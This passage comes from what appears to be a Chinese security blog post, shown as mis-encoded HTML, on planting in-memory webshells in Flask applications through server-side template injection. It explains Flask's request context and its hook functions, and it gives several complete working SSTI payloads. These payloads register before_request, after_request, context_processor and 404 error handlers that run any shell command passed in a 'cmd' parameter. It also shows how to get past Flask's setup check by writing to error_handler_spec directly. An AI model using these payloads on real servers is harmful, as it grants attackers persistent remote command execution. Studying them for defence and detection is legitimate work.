class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>é¦–å…ˆurl_for.__globals__[â€˜__builtins__â€˜][â€˜evalâ€™]è¿™å°±æ˜¯ä¸€ä¸ªsstiè·å–evalå‡½æ•°çš„payloadï¼Œurl_foræ˜¯Flaskçš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå…¶å‘½åç©ºé—´åŒ…å«å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬æˆ‘ä»¬å¾…ä¼šéœ€è¦æ‹¿çš„å½“å‰åº”ç”¨çš„ä¸Šä¸‹æ–‡</p><p><strong>app.add_url_rule</strong>ï¼Œè¿™æ˜¯è°ƒç”¨appçš„ä¸€ä¸ªadd_url_ruleçš„æ·»åŠ è·¯ç”±çš„å‡½æ•°ï¼Œæ˜¯å±äºFlaskç±»é‡Œé¢çš„ä¸€ä¸ªæˆå‘˜æ–¹æ³•ï¼Œå†™ä»£ç çš„æ—¶å€™ä¸€èˆ¬æ˜¯ä½¿ç”¨@app.routeè£…é¥°å™¨æ¥å®ç°çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æºç </p><p><img src="https://cdn.clown2024.cn/202410161650862.png" alt="image-20241016165044813"></p><p>ä»–è°ƒç”¨çš„å°±æ˜¯add_url_ruleï¼Œæˆ‘ä»¬å†å»çœ‹ä¸€ä¸‹add_url_ruleçš„æºç </p><p><img src="https://cdn.clown2024.cn/202410161652015.png" alt="image-20241016165251968"></p><p>å‚æ•°è¯´æ˜ï¼Œç›´æ¥é—®ä¸€æ‰‹gptï¼Œæ„Ÿè§‰è¯´çš„æŒºæ¸…æ¥šçš„</p><ol><li><strong><code>self</code></strong>:<ul><li>è¡¨ç¤ºå½“å‰ç±»çš„å®ä¾‹ï¼Œé€šå¸¸æ˜¯ Flask åº”ç”¨æˆ–è“å›¾çš„å®ä¾‹ã€‚</li></ul></li><li><strong><code>rule: str</code></strong>:<ul><li>URL è§„åˆ™çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œ<code>&#39;/hello&#39;</code> æˆ– <code>&#39;/users/&lt;int:id&gt;&#39;</code>ã€‚è¿™æ˜¯ç”¨æˆ·è®¿é—®æ—¶éœ€è¦åŒ¹é…çš„è·¯å¾„ã€‚</li></ul></li><li><strong><code>endpoint: t.Optional[str] = None</code></strong>:<ul><li>è§†å›¾å‡½æ•°çš„ç«¯ç‚¹åç§°ã€‚ç«¯ç‚¹æ˜¯ Flask ç”¨äºæ ‡è¯†è§†å›¾å‡½æ•°çš„å”¯ä¸€åç§°ã€‚å¦‚æœæœªæä¾›ï¼Œåˆ™ä¼šä» <code>view_func</code> è‡ªåŠ¨ç”Ÿæˆã€‚</li></ul></li><li><strong><code>view_func: t.Optional[t.Callable] = None</code></strong>:<ul><li>å¤„ç†è¯·æ±‚çš„è§†å›¾å‡½æ•°ã€‚å¦‚æœæä¾›äº†è¿™ä¸ªå‚æ•°ï¼ŒFlask ä¼šå°†å…¶ä¸ URL è§„åˆ™å…³è”ã€‚</li></ul></li><li><strong><code>provide_automatic_options: t.Optional[bool] = None</code></strong>:<ul><li>æŒ‡ç¤ºæ˜¯å¦è‡ªåŠ¨å¤„ç† OPTIONS è¯·æ±‚ã€‚å¦‚æœæœªæä¾›ï¼ŒFlask ä¼šæ ¹æ®è§†å›¾å‡½æ•°çš„å±æ€§å†³å®šã€‚</li></ul></li><li><strong><code>\**options: t.Any</code></strong>:<ul><li>å…¶ä»–å¯é€‰çš„å…³é”®å­—å‚æ•°ï¼Œå¯ä»¥ç”¨äºé…ç½® URL è§„åˆ™çš„è¡Œä¸ºï¼Œæ¯”å¦‚ <code>defaults</code>ã€<code>strict_slashes</code> ç­‰ã€‚</li></ul></li></ol><p>æ‰€ä»¥payloadçš„add_url_ruleçš„è¿™éƒ¨åˆ†å°±æ˜¯æ·»åŠ ä¸€ä¸ªè·¯ç”±ï¼Œç„¶åå¤„ç†å‡½æ•°æ˜¯ç”¨lambdaå…³é”®å­—å®šä¹‰çš„åŒ¿åå‡½æ•°</p><p><strong>app</strong>ï¼ševalçš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ç”¨å­—å…¸çš„å½¢å¼å®šä¹‰ä¸€äº›å…¨å±€å˜é‡ç»™ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ç”¨ï¼Œè¿™é‡Œçš„appå°±æ˜¯ç”¨url_forè·å–çš„åº”ç”¨çš„å½“å‰ä¸Šä¸‹æ–‡appï¼Œå±æ€§ä¸º<strong>current_app</strong>ï¼›</p><p><strong>_request_ctx_stack</strong>ï¼š<code>_request_ctx_stack</code>æ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ˜¯ä¸€ä¸ªLocalStackå®ä¾‹</p><p>ä¸ºä»€ä¹ˆè¦è·å–è¿™ä¸ªå˜é‡å‘¢ï¼Œè¿™å’ŒFlaskçš„è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶æœ‰å…³ï¼š</p><blockquote><p>å½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥Flaskï¼Œé¦–å…ˆä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯åœ¨Requestä¸­ï¼Œå¹¶å°†è¿™ä¸ªä¸Šä¸‹æ–‡æ¨å…¥åˆ°ä¸€ä¸ªåä¸º<code>_request_ctx_stack</code> çš„æ ˆç»“æ„ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è·å–å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡ç­‰åŒäºè·å–<code>_request_ctx_stack</code>çš„æ ˆé¡¶å…ƒç´ <code>_request_ctx_stack.top</code> ã€‚</p></blockquote><p>ç®€å•æ¥è®²ï¼Œå°±æ˜¯å½“ä¸€ä¸ªè¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ¥å°è£…å’Œè¿™ä¸ªè¯·æ±‚æœ‰å…³çš„ä¸œè¥¿ï¼Œç„¶åå†æ¨åˆ°æ ˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥sstiå»çœ‹ä¸€ä¸‹æ¥éªŒè¯</p><p>é¦–å…ˆæ˜¯<strong>url_for.__globals__[â€˜_request_ctx_stackâ€™].top</strong></p><p><img src="https://cdn.clown2024.cn/202410161712177.png" alt="image-20241016171228118"></p><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯ä¸€ä¸ªRequestContext å¯¹è±¡</p><p>å†çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆå±æ€§ï¼Œ<strong>url_for.__globals__[â€˜<em>request_ctx_stackâ€™].top.__dict</em>_</strong></p><p><img src="https://cdn.clown2024.cn/202410161714469.png" alt="image-20241016171427411"></p><p>å¯ä»¥çœ‹åˆ°requestå¯¹è±¡åœ¨é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„è·å–è¯·æ±‚ä¸­çš„getå’Œpostä¼ å‚çš„é‚£ä¸ªrequestï¼Œæ‰€ä»¥pyaloadä¸­ä¸ºä»€ä¹ˆè·å–è¿™ä¸ªrequestä¹Ÿå¾ˆæ¸…æ™°äº†</p><h2 id="ç»•è¿‡å˜å½¢"><a href="#ç»•è¿‡å˜å½¢" class="headerlink" title="ç»•è¿‡å˜å½¢"></a>ç»•è¿‡å˜å½¢</h2><p>å…¶å®ä¹Ÿå°±æ˜¯ä¸€äº›sstiçš„ç»•è¿‡ï¼Œå°±è®°å½•ä¸€ä¸‹url_forçš„æ›¿æ¢</p><ul><li><code>url_for</code>å¯ç”¨<code>get_flashed_messages</code>æˆ–<code>request.application.__self__._get_data_for_json</code>ç­‰æ›¿æ¢ï¼›</li></ul><p>get_flashed_messages.__globals__[â€˜_request_ctx_stackâ€™].top.__dict__</p><p><img src="https://cdn.clown2024.cn/202410161723665.png" alt="image-20241016172323613"></p><p>get_flashed_messages.__globals__</p><p>è¿™ä¸ªæœ‰å¾…è€ƒç©¶ï¼Œæˆ‘æ˜¯æ‰¾ä¸åˆ°ä»–çš„globalså±æ€§çš„ï¼Œä¼šç›´æ¥500ï¼Œæˆ‘çœ‹æ–‡ç« ä»–ä»¬å¤§æ¦‚æ˜¯è¿™ä¹ˆç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">request.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)<br></code></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªæ¥æ‹¿evalï¼Œç”¨ä¸Šé¢é‚£ä¸ªæ¥æ‹¿requestå’Œapp</p><p><strong>appçš„å¦å¤–è·å–</strong></p><p>æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡sys.modules[â€˜__main__â€˜].appè¿™ç§æ–¹å¼æ¥è·å–app</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><del>è‡³äº_request_ctx_stackæ€ä¹ˆæ‹¿ï¼Œè¿™æˆ‘æ²¡æ¢ç´¢å‡ºæ¥ï¼Œå¤ªèœäº†ğŸ˜¢</del></p><p>æ¬¸åæ¥æˆ‘åœ¨çœ‹å¤©å·¥å®éªŒå®¤é‚£ç¯‡æ–‡ç« å‘ç°æ€ä¹ˆæ‹¿äº†ï¼Œæ‹¿çš„ä¹Ÿæ˜¯RequestContextå¯¹è±¡ï¼Œä¸€èµ·å†™åœ¨åé¢çš„æ€»ç»“</p><h1 id="æ–°ç‰ˆå†…å­˜é©¬"><a href="#æ–°ç‰ˆå†…å­˜é©¬" class="headerlink" title="æ–°ç‰ˆå†…å­˜é©¬"></a>æ–°ç‰ˆå†…å­˜é©¬</h1><p>æˆ‘ä»¬æ›´æ–°ä¸€ä¸‹flaskï¼Œå†ç”¨ä½ç‰ˆæœ¬çš„payloadæ¥æ‰“ä¸€ä¸‹ï¼Œä¼šå‘ç°è¿™æ ·çš„æŠ¥é”™</p><p><img src="https://cdn.clown2024.cn/202410170055959.png" alt="image-20241017005507732"></p><p>ç„¶åå»çœ‹ä¸€ä¸‹å‡ºç°æŠ¥é”™çš„å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410170056971.png" alt="image-20241017005630921"></p><p>æ˜¯å› ä¸ºæˆ‘ä»¬çš„å‡½æ•°è¢«checkäº†ï¼Œä½ç‰ˆæœ¬æˆ‘å¼€äº†debugä¼šæŠ¥é”™ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ª</p><p>é‚£å°±ä»å…¶ä»–åœ°æ–¹å…¥æ‰‹ï¼Œç±»ä¼¼javaçš„filterå†…å­˜é©¬é‚£ç§å½¢å¼ï¼Œå³åœ¨è¯·æ±‚å‰æˆ–è€…åæ‰§è¡Œæ¶æ„æ“ä½œï¼Œpythonå°±æ˜¯æ‰¾çš„é’©å­å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶ç”¨çš„è£…é¥°å™¨å†…è°ƒç”¨çš„å‡½æ•°</p><blockquote><p>å…¶å®add_url_ruleè¿˜æ˜¯å¯ä»¥ç”¨ï¼Œåé¢å†è¯´</p></blockquote><h2 id="appbefore_request"><a href="#app-before-request" class="headerlink" title="@app.before_request"></a>@app.before_request</h2><p>ä»åå­—å°±èƒ½çŸ¥é“ï¼Œä»–çš„æ„æ€å°±æ˜¯åœ¨æˆ‘ä»¬çš„è¯·æ±‚å‰è¿›è¡Œä¸€äº›æ“ä½œ</p><p>ä»–çš„æ­£å¸¸å†™æ³•</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.before_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">before_request</span>():<br>    <span class="hljs-comment"># æ‰§è¡Œæ“ä½œæ¯”å¦‚èº«ä»½éªŒè¯</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.headers.get(<span class="hljs-string">&quot;Authorization&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span>,<span class="hljs-number">401</span><br></code></pre></td></tr></table></figure><p>å»çœ‹ä¸€ä¸‹å®ƒé‡Œé¢è°ƒç”¨çš„å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410181056847.png" alt="image-20241018105601756"></p><p>å¯ä»¥çœ‹åˆ°å®ƒè°ƒç”¨è¯¥æ–¹æ³•çš„å½¢å¼ï¼Œfå°±æ˜¯è®¿é—®å€¼ï¼Œæˆ‘ä»¬åªè¦åƒä½ç‰ˆæœ¬é‚£æ ·å†™ä¸€ä¸ªåŒ¿åçš„lambdaå‡½æ•°å³å¯</p><p>æ­£å¸¸èƒ½æ‰§è¡Œevalä¹‹åçš„payloadå½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;)<br></code></pre></td></tr></table></figure><p>æ”¹æˆèƒ½å¤Ÿæ¥å—å‚æ•°çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda : __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±åˆ©ç”¨lambdaå‡½æ•°æ¥è·å–getè¯·æ±‚å‚æ•°ç„¶åæ‰§è¡Œå‘½ä»¤æ¥å›æ˜¾</p><p><img src="https://cdn.clown2024.cn/202410181206135.png" alt="image-20241018120612584"></p><p><img src="https://cdn.clown2024.cn/202410181206831.png" alt="image-20241018120638777"></p><p>ä½†æ˜¯è¿™æ ·ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºlambdaå‡½æ•°æ˜¯ä¸€å®šä¼šæœ‰è¿”å›å€¼çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™æ ·æ‰“è¿›å»ååç»­çš„æœåŠ¡æ“ä½œéƒ½æ— æ³•è¿›è¡Œï¼Œä¼šå½±å“æ­£å¸¸ä¸šåŠ¡</p><blockquote><p>åœ¨æµ‹è¯•çš„è¿˜æœ‰æƒ…å†µå°±æ˜¯å¦‚æœpayloadæ‰“è¿›å»äº†ä½†æ˜¯åœ¨æ‰§è¡Œçš„æ—¶å€™å‡ºé”™äº†ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡å™¨ä¸€ç›´500.ä»»ä½•æ“ä½œéƒ½æ‰“ä¸äº†ï¼Œå› ä¸ºè¯¥é”™è¯¯ä»£ç å·²ç»è¢«æ’å…¥è¿›å»äº†ï¼Œä¸”ä¼šç¬¬ä¸€ä¸ªæ‰§è¡Œï¼Œè¿™æ—¶å€™å°±åªèƒ½é‡å¯æœåŠ¡äº†</p></blockquote><h2 id="appafter_request"><a href="#app-after-request" class="headerlink" title="@app.after_request"></a>@app.after_request</h2><p>é¡¾åæ€ä¹‰è¿™ä¸ªå°±æ˜¯åœ¨è¯·æ±‚ä¹‹åå¹²çš„äº‹ï¼Œæ€è·¯å’Œbefore_requestä¸€æ ·</p><p>æ­£å¸¸ç”¨æ³•</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.after_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">after_request</span>(<span class="hljs-params">response</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;after_request&quot;</span>)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>å…ˆå»çœ‹çœ‹ä»–çš„è°ƒç”¨å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410181233617.png" alt="image-20241018123326558"></p><p>è°ƒç”¨çš„å‡½æ•°åŒæ ·å¾ˆç±»ä¼¼ï¼Œåªä¸è¿‡ä»–çš„å‡½æ•°å¤šäº†ä¸€ä¸ªå‚æ•°è€Œå·²ï¼Œæ‰€ä»¥æˆ‘ä»¬åŒæ ·ç”¨ä¸Šé¢çš„payloadæ”¹ä¸€ä¸‹å³å¯</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda x: __import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410181247461.png" alt="image-20241018124743387"></p><p><img src="https://cdn.clown2024.cn/202410181247337.png" alt="image-20241018124755293"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸€å¼€å§‹æ‰“è¿›å»æ˜¯ä¼š500çš„ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰è®¾ç½®æ²¡æœ‰ä¼ é€’å‚æ•°cmdçš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™ä»–çš„è¿”å›å€¼ä¸æ˜¯strå°±ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TypeError: invalid cmd type (&lt;class &#x27;NoneType&#x27;&gt;, expected string)<br></code></pre></td></tr></table></figure><p>ä½†ä¹Ÿæ˜¯èƒ½æ­£å¸¸æ‰“çš„</p><p>ç„¶åçœ‹åˆ°ä¸€ä¸ªè€ƒè™‘äº†ä¸ä¼ å‚æƒ…å†µçš„payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ä¸‹è¿™ä¸ªlambdaå‡½æ•°æˆ‘ä»¬æ˜¯éœ€è¦ç»™ä¸€ä¸ªå‚æ•°ï¼Œè€Œä¸”è¦make_responseæ¥è¿”å›å€¼ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TypeError: &#x27;str&#x27; object is not callable<br></code></pre></td></tr></table></figure><h2 id="appteardown_request"><a href="#app-teardown-request" class="headerlink" title="@app.teardown_request"></a>@app.teardown_request</h2><p>è¯¥è£…é¥°å™¨ä¹Ÿæ˜¯åœ¨è¯·æ±‚åè°ƒç”¨å‡½æ•°ï¼Œä»–çš„payloadå’Œafter_requestä¸€æ ·ï¼Œæ”¹ä¸€ä¸‹å‡½æ•°åå³å¯</p><p><img src="https://cdn.clown2024.cn/202410181631773.png" alt="image-20241018163151698"></p><p>ä¸è¿‡è¯¥å‡½æ•°çš„è¿”å›å€¼ä¼šè¢«å¿½ç•¥ï¼Œæ‰€ä»¥æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæœ‰ç‚¹é¸¡è‚‹ï¼Œä¸å¤ªç”¨å®ƒ</p><h2 id="appcontext_processor"><a href="#app-context-processor" class="headerlink" title="@app.context_processor"></a>@app.context_processor</h2><p>è¯¥è£…é¥°å™¨ç”¨äºæ³¨å†Œä¸€ä¸ªä¸Šä¸‹æ–‡å¤„ç†å™¨ï¼Œå¯ä»¥å°†ä¸€ä¸ªæ¨¡æ¿å­—å…¸æ³¨å†Œåˆ°æ¨¡æ¿ä¸Šä¸‹æ–‡ä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†æŸä¸ªåå­—å®šä¹‰ä¸ºæœ‰æ„ä¹‰çš„ä¸œè¥¿ï¼Œæ¯”å¦‚åƒæˆ‘ä»¬çš„ä¸€æ ·</p><p>ç„¶åä»–çš„å†…éƒ¨è°ƒç”¨å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202410181650115.png" alt="image-20241018165058047"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.template_context_processors[None].append(lambda : &#123;&#x27;clown&#x27;: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read() if &#x27;cmd&#x27;in request.args.keys() else None&#125;)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;], &#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202410181654158.png" alt="image-20241018165411088"></p><p><img src="https://cdn.clown2024.cn/202410181654677.png" alt="image-20241018165421620"></p><h2 id="appteardown_appcontext"><a href="#app-teardown-appcontext" class="headerlink" title="@app.teardown_appcontext"></a>@app.teardown_appcontext</h2><p>ä»–çš„è°ƒç”¨å‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410181705473.png" alt="image-20241018170522417"></p><p>è¯¥æ–¹æ³•æ˜¯åœ¨è¯·æ±‚ç»“æŸçš„æ—¶å€™è°ƒç”¨ï¼Œè¿™ä¸ªé˜¶æ®µå› ä¸ºè¯·æ±‚è¢«é”€æ¯äº†æˆ‘ä»¬ä¹Ÿå°±æ‹¿ä¸åˆ°ç›¸å…³æ¯”å¦‚urlå‚æ•°ä¹‹ç±»çš„ä¸œè¥¿ï¼Œå¦‚æœè¦ç”¨è¯¥è¯¥å‡½æ•°æ‰“å†…å­˜é©¬ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨è¯¥å‡½æ•°å‰å°±éœ€è¦é…åˆå…¶ä»–è£…é¥°å™¨å…ˆå°†requestå¯¹è±¡ä¿å­˜åˆ°Flaskçš„å…¨å±€å˜é‡ï¼Œå±äºæ˜¯éå¸¸é¸¡è‚‹ï¼Œæ‰€ä»¥å°±ä¸æ¢ç´¢äº†è¿™éƒ¨åˆ†ï¼Œå°±çŸ¥é“æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿</p><h2 id="apperrorhandler"><a href="#app-errorhandler" class="headerlink" title="@app.errorhandler"></a>@app.errorhandler</h2><p>ä¸€ä¸ªé”™è¯¯å¤„ç†çš„è£…é¥°å™¨</p><p>æ­£å¸¸ç”¨æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">error</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br></code></pre></td></tr></table></figure><p>å½“å‡ºç°404æ˜¯å°±å›è¿”å›error</p><p><img src="https://cdn.clown2024.cn/202410181730600.png" alt="image-20241018173016540"></p><p>é‚£æ˜¯ä¸æ˜¯åªè¦æ§åˆ¶ä»–çš„è°ƒç”¨å‡½æ•°éšä¾¿è®¿é—®404é¡µé¢å°±èƒ½å†™é©¬äº†å‘¢</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ï¼Œä»–çš„è°ƒç”¨å‡½æ•°å¦‚ä¸‹ï¼š</p><p>register_error_handler</p><p><img src="https://cdn.clown2024.cn/202410181732134.png" alt="image-20241018173251068"></p><p>code_or_exceptionå°±æ˜¯æˆ‘ä»¬å‰é¢ä¼ çš„çŠ¶æ€ç ï¼Œfå°±æ˜¯å¤„ç†å‡½æ•°</p><p>ç„¶åä»¿ç…§å‰é¢çš„å†™æ³•æ¥æ‰“ä¸€ä¸‹å†…å­˜é©¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;app.register_error_handler(404,lambda x :__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()))&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410182309853.png" alt="image-20241018230903769"></p><p>æ¬¸ä¼šå‘ç°å®ƒæŠ¥é”™äº†ï¼Œçœ‹ä¸€ä¸‹æŠ¥äº†ä»€ä¹ˆé”™å‘¢</p><p><img src="https://cdn.clown2024.cn/202410182309191.png" alt="image-20241018230934134"></p><p>å¾ˆç†Ÿæ‚‰çš„é”™è¯¯ï¼Œåœ¨å‰é¢ä½ç‰ˆæœ¬æˆ‘ä»¬å¼€å¯debugæ¨¡å¼çš„æ—¶å€™ä¹Ÿå‡ºç°è¿‡è¿™æ ·çš„é”™è¯¯ï¼Œè¯´æ˜register_error_handlerè¿™ä¸ªå‡½æ•°è¢«checkäº†</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥å»è°ƒè¯•ä¸€ä¸‹</p><p>å†™ä¸€ä¸ªæ­£å¸¸çš„è£…é¥°å™¨ç„¶åæ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.clown2024.cn/202410182326928.png" alt="image-20241018232621872"></p><p>å»è®¿é—®ä¸€ä¸ª404é¡µé¢</p><p><img src="https://cdn.clown2024.cn/202410182327223.png" alt="image-20241018232742155"></p><p>çœ‹è°ƒç”¨æ ˆä»–ä¼šé©¬ä¸Šèµ°åˆ°è¿™ä¸ªcheckå‡½æ•°ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410182329373.png" alt="image-20241018232931317"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°register_error_handlerå‡½æ•°é‡Œé¢å®é™…ä¸Šåˆæ˜¯è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè€Œè¿™ä¸¤ä¸ªå‡½æ•°æ˜¯åœ¨checkä¹‹åï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°å°±å¯ä»¥ç»•è¿‡ä»–çš„checkæ£€æŸ¥äº†</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&quot;global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class]=lambda exc_class: __import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410181954570.png" alt="image-20241018195401485"></p><p><img src="https://cdn.clown2024.cn/202410181954846.png" alt="image-20241018195411798"></p><h2 id="ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±"><a href="#ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±" class="headerlink" title="ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±"></a>ç»•è¿‡checké€»è¾‘æ·»åŠ è·¯ç”±</h2><p>è¯´å›add_url_ruleå‡½æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹ä»–çš„å…·ä½“æŠ¥é”™é€»è¾‘</p><p>é¦–å…ˆåœ¨@setupmethodä¸­è°ƒç”¨äº†checkå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202410200010061.png" alt="image-20241019235616104"></p><p>è¿›åˆ°checkå‡½æ•°é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410200011769.png" 